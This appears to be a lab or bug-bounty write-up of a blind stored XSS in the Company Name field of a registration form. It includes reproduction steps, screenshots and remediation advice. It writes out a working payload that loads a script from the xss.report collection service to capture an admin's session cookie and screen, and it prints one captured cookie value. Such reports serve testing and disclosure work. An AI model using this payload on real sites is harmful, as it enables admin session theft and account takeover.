---
## Title
Blind Cross-Site Scripting (XSS) via Company Name Field in Registration

---
## Vulnerability Type
Blind XSS

---
## Summary
I identified a blind XSS in the **company Name Feild** during user registration. The feild accepts and stores raw HTML without any sanitization. The payload does not executes on the user side - it fires silently in the admin panel when an admin views the registered users list.This was confirmed via XSS report which captured a screenshot of the admin panel where the payload executed.

---
## Vulnerable Endpoint
```
https://kzlabs.com/63.php?view=register
```
---
## Steps to Reproduce
1. Register a new account in the following URL
 `https://kzlabs.com/63.php?view=register`

2. In the **Company Name** field enter the following blind XSS payload:
```
'"><script src=https://xss.report/c/shaz10></script>
```
3. Complete registration and log in.
5. Navigate to **My Profile** and the Company field shows `'">` confirming the payload was stored as-is but the script tag portion loaded silently in the background.
6. Wait for the admin to log in and open the admin dashboard.
7. Once the admin visits the dashboard the payload fires on their end and the XSS reporting tool at `xss.report` captures the execution along with a screenshot of what the admin viwed.
8. The XSS report dashboard captured a screenshot of the admin panel confirming execution

---
## Payload Used
```
'"><script src=https://xss.report/c/ali1></script>
```

---
## Proof of Concept

**Screenshot 1** — Registration form showing the blind XSS payload entered in the Company Name field, with the app itself warning "This field accepts any input including HTML content" confirming the field accepts raw HTML with no filtering at all.

<img width="1212" height="836" alt="lab63" src="https://github.com/user-attachments/assets/e81fe406-8ca4-4128-9e73-bd38dbb7e1c3" />



**Screenshot 2** — My Profile page showing the Company field rendering `'">` confirming the payload was stored as-is, the script tag portion loaded silently in the background.

<img width="1884" height="866" alt="Screenshot 2026-05-24 013603" src="https://github.com/user-attachments/assets/7730f1a7-0855-4b69-b99c-922de1311927" />


**Screenshot 3** — Admin dashboard showing the Recent Registrations table with the attacker's account (smith) and the stored payload visible in the Company column as `'">`, confirming the admin's browser loaded and executed the external script when the dashboard was opened.

<img width="1914" height="947" alt="Screenshot 2026-05-24 014029" src="https://github.com/user-attachments/assets/a5ae84a7-0918-4431-acfa-ba775dfee014" />


**Screenshot 4** — XSS reporting tool at xss.report showing the screenshot preview captured from the admin's browser session when the payload fired, confirming blind XSS execution on the admin side with the session cookie `5898fb3750074f1ce30274df` visible in the top right corner.

<img width="1908" height="937" alt="Screenshot 2026-05-24 014214" src="https://github.com/user-attachments/assets/7af3f047-2f1d-4d56-9683-890eb6dae419" />


---
## Impact
- The payload executes silently in the admin browser with zero interaction-just by opening the dashboard and viewing recent registrations 
- Admin session cookie is exposed - attacker can take over the admin account completly with no password needed.
- Since the admin has full access to manage all registered users a compromised admin account means full control over the entire platform
- The attacker also gets a screenshot of exactly what the admin sees leaking sensitive internal data like user emails, registration details and platform stats
- The victim admin has no isea anything happened - the page look completely normal.

---
## Remediation
1. Filter out dangerous HTML tags like `<script>`, `<img>`, `<svg>` from the Company Name field before saving anything to the database
2. Filter out JavaScript methods like `alert()`, `confirm()`, `prompt()` and block external script sources from being injected through input fields
3. If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
4. Implement a strict **Content Security Policy (CSP)** header that blocks loading of external scripts as this would have directly prevented the `xss.report` script from loading even if the payload got stored
5. Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
